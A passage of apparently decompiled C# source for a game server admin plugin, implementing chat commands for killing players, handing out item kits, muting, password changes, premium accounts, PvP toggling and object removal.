                }
                else
                {
                    Character character;
                    Users.SetFlags(playerClient.userID, UserFlags.godmode, false);
                    Character.FindByUser(playerClient.userID, out character);
                    TakeDamage.KillSelf(character, null);
                    Broadcast.Notice(Sender.networkPlayer, "✔", "User " + playerClient.userName + " was killed.", 5f);
                    Broadcast.Notice(playerClient.netPlayer, "☢", "You was a killed by " + Sender.displayName, 5f);
                    Helper.Log("\"" + playerClient.userName + "\" was a killed by \"" + Sender.displayName + "\" of used /kill command.", true);
                }
            }
            else
            {
                Broadcast.Notice(Sender.networkPlayer, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
            }
        }

        public static void KillAll(ConsoleSystem.Arg arg)
        {
            foreach (PlayerClient client in PlayerClient.All)
            {
                if (client.controllable.character != null)
                {
                    TakeDamage.KillSelf(client.controllable.character, null);
                }
            }
            Broadcast.NoticeAll("☢", "All players has killed on server.", null, 5f);
            Helper.Log("All players was killed by \"" + arg.argUser.displayName + "\".", true);
        }

        public static void Kit(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            Class6 class2 = new Class6();
            if (((Args == null) || (Args.Length == 0)) || ((Sender == null) && (Args.Length < 2)))
            {
                Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
            }
            else
            {
                string key = Args[0].ToLower().Trim();
                PlayerClient player = (Sender != null) ? Sender.playerClient : null;
                if (((Sender == null) || Sender.admin) && (Args.Length > 1))
                {
                    player = Helper.GetPlayerClient(Args[0]);
                    key = Args[1].ToLower().Trim();
                }
                if (player == null)
                {
                    if (Args.Length > 1)
                    {
                        Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
                    }
                }
                else
                {
                    if (player.netUser != Sender)
                    {
                        userData = Users.GetBySteamID(player.userID);
                    }
                    if (!Core.Kits.ContainsKey(key))
                    {
                        Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.Kit.NameNoFound", Sender, null).Replace("%KITNAME%", Args[0]), 5f);
                    }
                    else
                    {
                        System.Collections.Generic.List<string> list = (System.Collections.Generic.List<string>) Core.Kits[key];
                        if ((Sender == null) || Sender.admin)
                        {
                            foreach (string str2 in list)
                            {
                                if (str2.ToLower().StartsWith("item") && str2.Contains("="))
                                {
                                    string[] strArray = str2.Split(new char[] { '=' });
                                    if (strArray.Length >= 2)
                                    {
                                        int num;
                                        int num2;
                                        string[] strArray2 = strArray[1].Split(new char[] { ',' });
                                        string itemName = strArray2[0].Trim();
                                        if (strArray2.Length > 1)
                                        {
                                            if (!int.TryParse(strArray2[1].Trim(), out num))
                                            {
                                                num = 1;
                                            }
                                        }
                                        else
                                        {
                                            num = 1;
                                        }
                                        if (strArray2.Length > 2)
                                        {
                                            if (!int.TryParse(strArray2[2].Trim(), out num2))
                                            {
                                                num2 = -1;
                                            }
                                        }
                                        else
                                        {
                                            num2 = -1;
                                        }
                                        Helper.GiveItem(player, itemName, num, num2);
                                    }
                                }
                            }
                            Broadcast.Notice(player.netUser, "☢", Config.GetMessageCommand("Command.Kit.Received", "", Sender).Replace("%KITNAME%", key), 5f);
                            Helper.Log(string.Concat(new object[] { "User [", player.netUser.displayName, ":", player.netUser.userID, "] received a kit \"", key, "\" by ", (Sender == null) ? "server console" : Sender.displayName, "." }), true);
                        }
                        else
                        {
                            bool flag;
                            class2.string_0 = Command + "." + key;
                            int result = 0;
                            if (predicate_1 == null)
                            {
                                predicate_1 = new Predicate<string>(Commands.smethod_1);
                            }
                            string str4 = list.Find(predicate_1);
                            if (!string.IsNullOrEmpty(str4) && str4.Contains("="))
                            {
                                int.TryParse(str4.Split(new char[] { '=' })[1], out result);
                            }
                            Countdown countdown = Users.CountdownList(userData.SteamID).Find(new Predicate<Countdown>(class2.method_0));
                            if (countdown != null)
                            {
                                if (!countdown.Expires && (result == -1))
                                {
                                    Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Kit.ReceivedOnce", Sender, null).Replace("%KITNAME%", Args[0]), 5f);
                                    return;
                                }
                                if ((countdown.TimeLeft > -1.0) && (result > -1))
                                {
                                    TimeSpan span = TimeSpan.FromSeconds(countdown.TimeLeft);
                                    string text = Config.GetMessage("Command.Kit.Countdown", Sender, null).Replace("%KITNAME%", Args[0]);
                                    if (span.TotalHours > 0.0)
                                    {
                                        text = text.Replace("%TIME%", string.Format("{0:F0}:{1:D2}:{2:D2}", span.TotalHours, span.Minutes, span.Seconds));
                                    }
                                    else if (span.TotalMinutes > 0.0)
                                    {
                                        text = text.Replace("%TIME%", string.Format("{0}:{1:D2}", span.Minutes, span.Seconds));
                                    }
                                    else
                                    {
                                        text = text.Replace("%TIME%", string.Format("{0:D2}", span.Seconds));
                                    }
                                    Broadcast.Notice(Sender, "☢", text, 5f);
                                    return;
                                }
                                Users.CountdownRemove(userData.SteamID, countdown);
                            }
                            if (predicate_2 == null)
                            {
                                predicate_2 = new Predicate<string>(Commands.smethod_2);
                            }
                            string str6 = list.Find(predicate_2);
                            if (!(flag = string.IsNullOrEmpty(str6) || !str6.Contains("=")))
                            {
                                str6 = str6.Split(new char[] { '=' })[1].Trim();
                                flag = string.IsNullOrEmpty(str6);
                            }
                            if (!flag)
                            {
                                foreach (string str7 in str6.Split(new char[] { ',' }))
                                {
                                    int num4;
                                    if (flag = int.TryParse(str7, out num4) && (num4 == userData.Rank))
                                    {
                                        break;
                                    }
                                }
                            }
                            if (!flag)
                            {
                                Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.Kit.NotAvailabled", "", Sender).Replace("%KITNAME%", key), 5f);
                            }
                            else
                            {
                                foreach (string str8 in list)
                                {
                                    if (str8.ToLower().StartsWith("item") && str8.Contains("="))
                                    {
                                        string[] strArray3 = str8.Split(new char[] { '=' });
                                        if (strArray3.Length >= 2)
                                        {
                                            int num5;
                                            int num6;
                                            string[] strArray4 = strArray3[1].Split(new char[] { ',' });
                                            string str9 = strArray4[0].Trim();
                                            if (strArray4.Length > 1)
                                            {
                                                if (!int.TryParse(strArray4[1].Trim(), out num5))
                                                {
                                                    num5 = 1;
                                                }
                                            }
                                            else
                                            {
                                                num5 = 1;
                                            }
                                            if (strArray4.Length > 2)
                                            {
                                                if (!int.TryParse(strArray4[2].Trim(), out num6))
                                                {
                                                    num6 = -1;
                                                }
                                            }
                                            else
                                            {
                                                num6 = -1;
                                            }
                                            Helper.GiveItem(player, str9, num5, num6);
                                            Users.CountdownAdd(userData.SteamID, new Countdown(class2.string_0, (double) result));
                                        }
                                    }
                                }
                                Broadcast.Notice(player.netUser, "☢", Config.GetMessageCommand("Command.Kit.Received", "", Sender).Replace("%KITNAME%", key), 5f);
                            }
                        }
                    }
                }
            }
        }

        public static void Kits(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            string str = "";
            foreach (string str2 in Core.Kits.Keys)
            {
                bool flag;
                System.Collections.Generic.List<string> list = (System.Collections.Generic.List<string>) Core.Kits[str2];
                if (predicate_0 == null)
                {
                    predicate_0 = new Predicate<string>(Commands.smethod_0);
                }
                string str3 = list.Find(predicate_0);
                if (!(flag = string.IsNullOrEmpty(str3) || !str3.Contains("=")))
                {
                    str3 = str3.Split(new char[] { '=' })[1].Trim();
                    flag = string.IsNullOrEmpty(str3);
                }
                if (!flag)
                {
                    foreach (string str4 in str3.Split(new char[] { ',' }))
                    {
                        int num;
                        if (flag = int.TryParse(str4, out num) && (num == userData.Rank))
                        {
                            break;
                        }
                    }
                }
                if (flag)
                {
                    str = str + str2 + ", ";
                }
            }
            if (string.IsNullOrEmpty(str))
            {
                Broadcast.Notice(Sender.networkPlayer, "☢", Config.GetMessage("Command.Kits.NotAvailable", Sender, null), 5f);
            }
            else
            {
                if (str.Length >= 2)
                {
                    str = str.Substring(0, str.Length - 2);
                }
                Broadcast.Message(Sender, Config.GetMessage("Command.Kits.Availabled", Sender, null).Replace("%KITS%", str), null, 0f);
            }
        }

        public static void Language(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            if ((Args != null) && (Args.Length != 0))
            {
                int num;
                if ((int.TryParse(Args[0], out num) && (num > 0)) && (Core.Languages.Length >= num))
                {
                    userData.Language = Core.Languages[num - 1];
                    Broadcast.Message(Sender, Config.GetMessage("Command.Language.Changed", Sender, null).Replace("%USER.LANG%", userData.Language), null, 0f);
                }
                else
                {
                    Broadcast.Notice(Sender.networkPlayer, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
                }
            }
            else
            {
                string str = Config.GetMessage("Command.Language.Selected", Sender, null);
                Broadcast.Message(Sender, Config.GetMessage("Command.Language.List", Sender, null), null, 0f);
                for (int i = 0; i < Core.Languages.Length; i++)
                {
                    Broadcast.Message(Sender, string.Concat(new object[] { i + 1, ". ", Core.Languages[i], (Core.Languages[i] == userData.Language) ? str : "" }), null, 0f);
                }
                Broadcast.Message(Sender, Config.GetMessage("Command.Language.Usage", Sender, null), null, 0f);
            }
        }

        public static void Location(NetUser Sender, UserData userData, string[] Args)
        {
            PlayerClient playerClient = Sender.playerClient;
            if (((Args != null) && (Args.Length > 0)) && Sender.admin)
            {
                playerClient = Helper.GetPlayerClient(Args[0]);
                if (playerClient == null)
                {
                    Broadcast.Notice(Sender.networkPlayer, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
                    return;
                }
                userData = Users.GetBySteamID(playerClient.userID);
            }
            string str = (playerClient.netUser != Sender) ? playerClient.netUser.displayName : "You";
            string name = "World";
            if (userData.Zone != null)
            {
                name = userData.Zone.Name;
            }
            Broadcast.Message(Sender, str + " are in \"" + name + "\" zone.", null, 0f);
        }

        public static void Mute(NetUser Sender, string Command, string[] Args)
        {
            if ((Args != null) && (Args.Length != 0))
            {
                UserData data = Users.Find(Args[0]);
                NetUser player = null;
                if (data == null)
                {
                    Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
                }
                else
                {
                    int chatMuteDefaultTime = Core.ChatMuteDefaultTime;
                    if ((Args.Length > 1) && !int.TryParse(Args[1], out chatMuteDefaultTime))
                    {
                        chatMuteDefaultTime = 0;
                    }
                    Countdown countdown = Users.CountdownGet(data.SteamID, "mute");
                    if ((countdown == null) || (Args.Length > 1))
                    {
                        player = NetUser.FindByUserID(data.SteamID);
                        if (countdown != null)
                        {
                            Users.CountdownRemove(data.SteamID, "mute");
                        }
                        countdown = new Countdown("mute", (double) chatMuteDefaultTime);
                        Users.CountdownAdd(data.SteamID, countdown);
                    }
                    TimeSpan span = TimeSpan.FromSeconds(countdown.TimeLeft);
                    string newValue = countdown.Expires ? string.Format("{0}:{1:D2}:{2:D2}", span.Hours, span.Minutes, span.Seconds) : "-:-:-";
                    Broadcast.Notice(Sender, "☢", "User \"" + data.Username + "\" muted on " + newValue + ".", 5f);
                    Broadcast.MessageAll(Config.GetMessage("Command.Mute.PlayerMuted", Sender, null).Replace("%TARGET%", data.Username).Replace("%TIME%", newValue));
                    if (player != null)
                    {
                        Broadcast.Notice(player, "☢", Config.GetMessage("Player.Muted", null, null).Replace("%TIME%", newValue), 5f);
                    }
                }
            }
            else
            {
                Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
            }
        }

        public static void Online(NetUser Sender, string[] Args)
        {
            Broadcast.Message(Sender, Config.GetMessageCommand("Command.Online", "", Sender), null, 0f);
        }

        public static void Password(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            if ((Args != null) && (Args.Length != 0))
            {
                if (Args[0].Length < 3)
                {
                    Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.Password.NewTooShort", Sender, null), 5f);
                }
                else if (Args[0].Length > 0x40)
                {
                    Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.Password.NewTooLong", Sender, null), 5f);
                }
                else
                {
                    Broadcast.Notice(Sender, "✔", Config.GetMessage("Command.Password.Changed", Sender, null), 5f);
                    userData.Password = Args[0].Trim();
                    if (Users.MD5Password)
                    {
                        byte[] bytes = Encoding.UTF8.GetBytes(userData.Password);
                        bytes = MD5.Create().ComputeHash(bytes);
                        userData.Password = BitConverter.ToString(bytes, 0).Replace("-", "");
                    }
                }
            }
            else if (userData.Password.IsEmpty())
            {
                Broadcast.Message(Sender, Config.GetMessage("Command.Password.IsEmpty", Sender, null), null, 0f);
            }
            else
            {
                Broadcast.Message(Sender, Config.GetMessage("Command.Password.Display", Sender, null).Replace("%PASSWORD%", userData.Password), null, 0f);
            }
        }

        public static void Personal(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            if ((Args != null) && (Args.Length >= 3))
            {
                UserData data = Users.Find(Args[0]);
                if (data == null)
                {
                    Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
                }
                else
                {
                    NetUser player = NetUser.FindByUserID(data.SteamID);
                    ItemDataBlock byName = DatablockDictionary.GetByName(Args[1]);
                    if (byName == null)
                    {
                        Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.ItemNoFound", Sender, Args[1]), 5f);
                    }
                    else
                    {
                        int quantity = 5;
                        if (Args.Length > 2)
                        {
                            quantity = int.Parse(Args[2]);
                        }
                        if (quantity == 0)
                        {
                            quantity = 5;
                        }
                        Users.PersonalAdd(data.SteamID, byName.name, quantity);
                        quantity = Users.PersonalList(data.SteamID)[byName.name];
                        Helper.GiveItem(player.playerClient, byName.name, 1, -1);
                        Broadcast.Message(Sender, string.Concat(new object[] { "You give a premium ", byName.name, " item on ", quantity, " deaths." }), null, 0f);
                        Helper.Log(string.Concat(new object[] { userData.Username, " give a premium ", byName.name, " item on ", quantity, " deaths for ", data.Username }), true);
                        if (player != null)
                        {
                            Broadcast.Notice(player, "☢", Config.GetMessage("Player.Premium.ReceivedItem", Sender, null).Replace("%ITEMNAME%", byName.name).Replace("%FORDEATHS%", quantity.ToString()), 5f);
                        }
                    }
                }
            }
            else
            {
                Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
            }
        }

        public static void Ping(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            if ((userData.HasFlag(UserFlags.admin) && (Args != null)) && (Args.Length > 0))
            {
                PlayerClient playerClient = Helper.GetPlayerClient(Args[0]);
                if (playerClient == null)
                {
                    Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
                }
                else
                {
                    Broadcast.Message(Sender, string.Concat(new object[] { playerClient.netUser.displayName, "'s average ping is ", playerClient.netPlayer.averagePing, " ms." }), null, 0f);
                }
            }
            else
            {
                Broadcast.Message(Sender, "Your average ping is " + Sender.networkPlayer.averagePing + " ms.", null, 0f);
            }
        }

        public static void Players(NetUser Sender, string Command, string[] CmdArgs)
        {
            string str = "";
            Broadcast.Message(Sender, Config.GetMessage("Command.Players", Sender, null), null, 0f);
            foreach (PlayerClient client in PlayerClient.All)
            {
                if (!Users.HasFlag(client.netUser.userID, UserFlags.invis))
                {
                    str = str + client.netUser.displayName + ", ";
                    if (str.Length > 70)
                    {
                        Broadcast.Message(Sender, str.Substring(0, str.Length - 2), null, 0f);
                        str = "";
                    }
                }
            }
            if (str.Length != 0)
            {
                Broadcast.Message(Sender, str.Substring(0, str.Length - 2), null, 0f);
            }
        }

        public static void PM(NetUser Sender, string Command, string[] Args)
        {
            if ((Args != null) && (Args.Length >= 2))
            {
                PlayerClient playerClient = Helper.GetPlayerClient(Args[0]);
                if (playerClient == null)
                {
                    Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
                }
                else if (playerClient.netUser == Sender)
                {
                    Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PM.Self", Sender, null), 5f);
                }
                else if (Users.HasFlag(playerClient.netUser.userID, UserFlags.invis))
                {
                    Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
                }
                else
                {
                    Countdown countdown = Users.CountdownGet(Sender.userID, "mute");
                    if (countdown != null)
                    {
                        if (!countdown.Expired)
                        {
                            TimeSpan span = TimeSpan.FromSeconds(countdown.TimeLeft);
                            string newValue = countdown.Expires ? string.Format("{0}:{1:D2}:{2:D2}", span.Hours, span.Minutes, span.Seconds) : "-:-:-";
                            Broadcast.Notice(Sender, "☢", Config.GetMessage("Player.Muted", Sender, null).Replace("%TIME%", newValue), 5f);
                            return;
                        }
                        Users.CountdownRemove(Sender.userID, countdown);
                    }
                    string[] destinationArray = Args;
                    Array.Copy(Args, 1, destinationArray, 0, Args.Length - 1);
                    Array.Resize<string>(ref destinationArray, destinationArray.Length - 1);
                    Broadcast.ChatPM(Sender, playerClient.netUser, string.Join(" ", destinationArray));
                    if (!Core.Reply.ContainsKey(playerClient.userID))
                    {
                        Core.Reply.Add(playerClient.userID, Sender);
                    }
                    else
                    {
                        Core.Reply[playerClient.userID] = Sender;
                    }
                }
            }
            else
            {
                Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
            }
        }

        public static void Position(NetUser Sender, UserData userData, string[] Args)
        {
            PlayerClient playerClient = Sender.playerClient;
            if (((Args != null) && (Args.Length > 0)) && Sender.admin)
            {
                playerClient = Helper.GetPlayerClient(Args[0]);
                if (playerClient == null)
                {
                    Broadcast.Notice(Sender.networkPlayer, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
                    return;
                }
            }
            Vector3 lastKnownPosition = playerClient.lastKnownPosition;
            string str = (playerClient.netUser != Sender) ? playerClient.netUser.displayName : "Your";
            Broadcast.Message(Sender, str + " position is: X: " + lastKnownPosition.x.ToString("0.00") + ", Y: " + lastKnownPosition.y.ToString("0.00") + ", Z: " + lastKnownPosition.z.ToString("0.00"), null, 0f);
        }

        public static void Premium(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            TimeSpan span;
            double result = 0.0;
            if ((userData.HasFlag(UserFlags.admin) && (Args != null)) && (Args.Length > 0))
            {
                NetUser player = null;
                UserData data = Users.Find(Args[0]);
                if (data == null)
                {
                    Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
                }
                else if (Args.Length > 1)
                {
                    if ((Args[1].ToLower() == "disable") || (Args[1].ToLower() == "0"))
                    {
                        Users.SetFlags(data.SteamID, UserFlags.premium, false);
                        Users.SetRank(data.SteamID, Users.DefaultRank);
                        Users.SetPremiumDate(data.SteamID, new DateTime());
                        SaveAll(Sender);
                        player = NetUser.FindByUserID(data.SteamID);
                        if (player != null)
                        {
                            Broadcast.Notice(player, "☢", Config.GetMessage("Player.Premium.Disabled", Sender, null), 5f);
                        }
                        if (Sender != null)
                        {
                            Broadcast.Message(Sender, "You have disabled premium account for " + data.Username, null, 0f);
                        }
                        Helper.Log(userData.Username + " has disabled premium account for " + data.Username, true);
                    }
                    else
                    {
                        bool flag = (Args.Length > 1) && Args[1].StartsWith("+");
                        bool flag2 = (Args.Length > 1) && Args[1].StartsWith("-");
                        if (Args.Length > 1)
                        {
                            Args[1] = Args[1].Replace("+", "").Replace("-", "").Trim();
                        }
                        if (!double.TryParse(Args[1], out result))
                        {
                            Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
                        }
                        else if (result > 999.0)
                        {
                            Broadcast.Notice(Sender, "✘", "Cannot set of premium days over is 999.", 5f);
                        }
                        else
                        {
                            DateTime date = (data.PremiumDate > DateTime.Now) ? data.PremiumDate : DateTime.Now;
                            if (flag)
                            {
                                date = date.AddDays(result);
                            }
                            else if (flag2)
                            {
                                if (data.PremiumDate.Ticks <= 0L)
                                {
                                    return;
                                }
                                if (data.PremiumDate.Subtract(DateTime.Now).TotalDays < result)
                                {
                                    Users.SetFlags(data.SteamID, UserFlags.premium, false);
                                    Users.SetRank(data.SteamID, Users.DefaultRank);
                                    Users.SetPremiumDate(data.SteamID, new DateTime());
                                    SaveAll(Sender);
                                    player = NetUser.FindByUserID(data.SteamID);
                                    if (player != null)
                                    {
                                        Broadcast.Notice(player, "☢", Config.GetMessage("Player.Premium.Disabled", Sender, null), 5f);
                                    }
                                    if (Sender != null)
                                    {
                                        Broadcast.Message(Sender, "You have disabled premium account for " + data.Username, null, 0f);
                                    }
                                    Helper.Log(userData.Username + " has disabled premium account for " + data.Username, true);
                                    return;
                                }
                                date = date.Subtract(TimeSpan.FromDays(result));
                            }
                            else
                            {
                                date = DateTime.Now.AddDays(result);
                            }
                            Users.SetPremiumDate(data.SteamID, date);
                            Users.SetFlags(data.SteamID, UserFlags.premium, true);
                            Users.SetRank(data.SteamID, Users.PremiumRank);
                            SaveAll(Sender);
                            span = data.PremiumDate.Subtract(DateTime.Now);
                            if (Sender != null)
                            {
                                Broadcast.Message(Sender, string.Concat(new object[] { "You set ", span.Days, " day(s) of premium for ", data.Username, ", expired: ", data.PremiumDate.ToString("dd/MM/yyyy HH:mm") }), null, 0f);
                            }
                            Helper.Log(string.Concat(new object[] { userData.Username, " set ", span.Days, " day(s) of premium for ", data.Username, ", expired: ", data.PremiumDate.ToString("dd/MM/yyyy HH:mm") }), true);
                            player = NetUser.FindByUserID(data.SteamID);
                            if (player != null)
                            {
                                Broadcast.Notice(player, "☢", Config.GetMessage("Player.Premium.Received", Sender, null).Replace("%PREMIUM_DATE%", data.PremiumDate.ToString("dd/MM/yyyy HH:mm")).Replace("%PREMIUM_DAYS%", span.Days.ToString()), 5f);
                            }
                        }
                    }
                }
                else if (data.PremiumDate >= DateTime.Now)
                {
                    span = data.PremiumDate.Subtract(DateTime.Now);
                    Broadcast.Message(Sender, "Premium of " + data.Username + " has expires: " + data.PremiumDate.ToString("dd/MM/yyyy HH:mm") + " after: " + string.Format("{0} day(s), {1} hour(s).", span.Days, span.Hours), null, 0f);
                }
                else
                {
                    data.PremiumDate = new DateTime();
                    Broadcast.Message(Sender, "User " + data.Username + " without premium account.", null, 0f);
                }
            }
            else if (!userData.PremiumDate.Equals(new DateTime()))
            {
                if (userData.PremiumDate >= DateTime.Now)
                {
                    span = userData.PremiumDate.Subtract(DateTime.Now);
                    Broadcast.Message(Sender, Config.GetMessage("Player.Premium.Expires", Sender, null).Replace("%PREMIUM_DATE%", userData.PremiumDate.ToString("dd/MM/yyyy HH:mm")).Replace("%PREMIUM_DAYS%", string.Format("{0} day(s), {1} hour(s).", span.Days, span.Hours)), null, 0f);
                }
                else
                {
                    Users.SetFlags(userData.SteamID, UserFlags.premium, false);
                    Users.SetRank(userData.SteamID, Users.DefaultRank);
                    Users.SetPremiumDate(userData.SteamID, new DateTime());
                    Broadcast.Notice(Sender, "☢", Config.GetMessage("Player.Premium.Expired", Sender, null), 5f);
                }
            }
            else
            {
                Broadcast.Message(Sender, Config.GetMessage("Player.Premium.Not", Sender, null), null, 0f);
            }
        }

        public static void PvP(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            Predicate<Countdown> match = null;
            Predicate<EventTimer> predicate2 = null;
            Predicate<EventTimer> predicate3 = null;
            Class11 class2 = new Class11 {
                netUser_0 = Sender,
                string_0 = Command
            };
            if ((class2.netUser_0 == null) && (Args == null))
            {
                Broadcast.Notice(class2.netUser_0, "✘", Config.GetMessageCommand("Command.InvalidSyntax", class2.string_0, class2.netUser_0), 5f);
            }
            else if (((Args != null) && (Args.Length > 0)) && ((class2.netUser_0 == null) || class2.netUser_0.admin))
            {
                if (Args[0].ToUpper() == "ON")
                {
                    Broadcast.NoticeAll("☢", Config.GetMessage("Cycle.PvP.Enabled", null, null), null, 5f);
                    server.pvp = true;
                }
                else if (Args[0].ToUpper() == "OFF")
                {
                    Broadcast.NoticeAll("☢", Config.GetMessage("Cycle.PvP.Disabled", null, null), null, 5f);
                    server.pvp = false;
                }
                else
                {
                    userData = Users.Find(Args[0]);
                    if (userData == null)
                    {
                        Broadcast.Notice(class2.netUser_0, "✘", Config.GetMessage("Command.PlayerNoFound", class2.netUser_0, Args[0]), 5f);
                    }
                    else
                    {
                        Users.ToggleFlag(userData.SteamID, UserFlags.nopvp);
                        NetUser player = NetUser.FindByUserID(userData.SteamID);
                        if (player != null)
                        {
                            Broadcast.Notice(player, "☢", "PvP has " + (userData.HasFlag(UserFlags.nopvp) ? "enabled" : "disabled") + " for you.", 5f);
                        }
                        Broadcast.Notice(class2.netUser_0, "☢", "PvP mode has " + (userData.HasFlag(UserFlags.nopvp) ? "enabled" : "disabled") + " for " + userData.Username + ".", 5f);
                    }
                }
            }
            else if (class2.netUser_0 != null)
            {
                if (match == null)
                {
                    match = new Predicate<Countdown>(class2.method_0);
                }
                Countdown countdown = Users.CountdownList(userData.SteamID).Find(match);
                if (countdown != null)
                {
                    if (!countdown.Expired)
                    {
                        TimeSpan span = TimeSpan.FromSeconds(countdown.TimeLeft);
                        Broadcast.Notice(class2.netUser_0.networkPlayer, "✘", Config.GetMessage("Command.PvP.Countdown", class2.netUser_0, null).Replace("%TIME%", string.Format("{0}:{1:D2}", span.Minutes, span.Seconds)), 5f);
                        return;
                    }
                    Users.CountdownRemove(userData.SteamID, countdown);
                }
                if (predicate2 == null)
                {
                    predicate2 = new Predicate<EventTimer>(class2.method_1);
                }
                EventTimer item = Events.Timer.Find(predicate2);
                if (item != null)
                {
                    if (item.TimeLeft > 0.0)
                    {
                        Broadcast.Notice(class2.netUser_0.networkPlayer, "☢", Config.GetMessage("Command.PvP.Wait", class2.netUser_0, null).Replace("%SECONDS%", item.TimeLeft.ToString()), 5f);
                        return;
                    }
                    item.Dispose();
                    Events.Timer.Remove(item);
                }
                if (Events.DisablePvP(class2.netUser_0, class2.string_0, (double) Core.CommandNoPVPTimewait))
                {
                    if (predicate3 == null)
                    {
                        predicate3 = new Predicate<EventTimer>(class2.method_2);
                    }
                    item = Events.Timer.Find(predicate3);
                    if (item.TimeLeft > 0.0)
                    {
                        Broadcast.Notice(class2.netUser_0, "☢", Config.GetMessage("Command.PvP.Start", class2.netUser_0, null).Replace("%SECONDS%", item.TimeLeft.ToString()), 5f);
                        Broadcast.NoticeAll("☢", Config.GetMessage("Command.PvP.NoticeStart", class2.netUser_0, null).Replace("%SECONDS%", item.TimeLeft.ToString()), class2.netUser_0, 5f);
                    }
                }
            }
        }

        public static void Remove(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            if (((Args != null) && (Args.Length > 0)) && (Args[0] != "1"))
            {
                int num = Helper.RemoveAllObjects(Args[0]);
                if (Sender != null)
                {
                    Broadcast.Message(Sender, string.Concat(new object[] { "[COLOR#FF5F5F]Removed ", num, " object(s) with name \"", Args[0], "\"." }), null, 0f);
                }
            }
            else if (Sender != null)
            {
                GameObject obj2 = Helper.GetLookObject(Helper.GetLookRay(Sender), 100f, -1);
                if (((obj2 == null) || (obj2.collider is TerrainCollider)) || obj2.CompareTag("Tree Collider"))
                {
                    Broadcast.Notice(Sender, "✘", "Where nothing for remove", 3f);
                }
                else if (obj2.name.IsEmpty())
                {
                    Broadcast.Notice(Sender, "✘", "Where nothing for remove", 3f);
                }
                else
                {
                    string str = Helper.NiceName(obj2.name);
                    bool force = ((Args != null) && (Args.Length > 0)) && (Args[0] == "1");
                    if (Helper.RemoveObject(obj2, force))
                    {
                        Broadcast.Message(Sender, "[COLOR#FF5F5F]Object \"" + str + "\" removed.", null, 0f);
                    }
                    else
                    {
                        Broadcast.Message(Sender, "Object \"" + str + "\" cannot be removed.", null, 0f);
                    }
                }
            }
        }

        public static void Reply(NetUser Sender, string Command, string[] Args)
        {
            if ((Args != null) && (Args.Length != 0))
            {
                if (!Core.Reply.ContainsKey(Sender.userID))
                {
                    Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.Reply.Nobody", Sender, null), 5f);
                }
                else
                {
                    NetUser client = Core.Reply[Sender.userID];
                    if (client == null)
                    {
                        Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, client.displayName), 5f);
                    }
                    else if (client == Sender)
                    {
                        Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PM.Self", Sender, null), 5f);
                    }
                    else
                    {
                        Countdown countdown = Users.CountdownGet(Sender.userID, "mute");
                        if (countdown != null)
                        {
                            if (!countdown.Expired)
                            {
                                TimeSpan span = TimeSpan.FromSeconds(countdown.TimeLeft);
                                string newValue = countdown.Expires ? string.Format("{0}:{1:D2}:{2:D2}", span.Hours, span.Minutes, span.Seconds) : "-:-:-";
                                Broadcast.Notice(Sender, "☢", Config.GetMessage("Player.Muted", Sender, null).Replace("%TIME%", newValue), 5f);
                                return;
                            }
                            Users.CountdownRemove(Sender.userID, countdown);
                        }
                        Broadcast.ChatPM(Sender, client, string.Join(" ", Args));
                        if (!Core.Reply.ContainsKey(client.userID))
                        {
                            Core.Reply.Add(client.userID, Sender);
                        }
                        else
                        {
                            Core.Reply[client.userID] = Sender;
                        }
                    }
                }
            }
            else
            {
                Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
            }
        }

        public static void Restart(NetUser Sender, string Cmd, string[] Args)
        {
            if (Core.HasShutdown)
            {
                if ((serv.RestartEvent != null) && (serv.ShutdownLeft > 10))
                {
                    Broadcast.Notice(Sender, "☢", "Server shutdown to restart has been stopped.", 5f);
                    Broadcast.NoticeAll("☢", "Server shutdown to restart has been stopped.", Sender, 5f);
                    serv.RestartEvent.Stop();
                    serv.RestartEvent.Dispose();
                    serv.RestartEvent = null;
                    Core.HasShutdown = false;
                }
                else
                {
                    Broadcast.Notice(Sender, "☢", "Server during the shutdown.", 5f);
                }
            }
            else
            {
                if ((Args != null) && (Args.Length > 0))
                {
                    int.TryParse(Args[0], out serv.ShutdownTime);
                }
                if (serv.ShutdownTime == 0)
